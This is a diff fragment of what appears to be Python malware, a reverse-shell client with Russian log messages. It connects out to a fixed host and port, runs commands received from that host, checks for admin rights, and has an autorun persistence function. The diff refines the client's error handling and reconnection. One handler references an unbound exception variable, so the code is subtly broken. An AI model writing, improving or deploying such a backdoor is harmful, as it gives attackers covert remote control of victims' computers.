@@ -146,7 +146,8 @@ def shell(sock):
                 is_admin(sock)
             else:
                 execute_command(sock, command)
-        except:
+        except Exception as e:
+            logging.error(f"[!!] Ошибка в shell: {e}")
             break
 
 
@@ -157,13 +158,9 @@ def connection():
             sock.connect(("192.168.178.67", 54321))
             logging.info("[+] Успешное подключение к серверу")
             shell(sock)
-            sock.close()
         except socket.error:
             logging.error(f"[!!] Ошибка подключения: {e}")
             time.sleep(5)
-        except:
-            logging.error(f"[!!] Ошибка в connection: {e}")
-            break
 
 
 def setup_autorun():
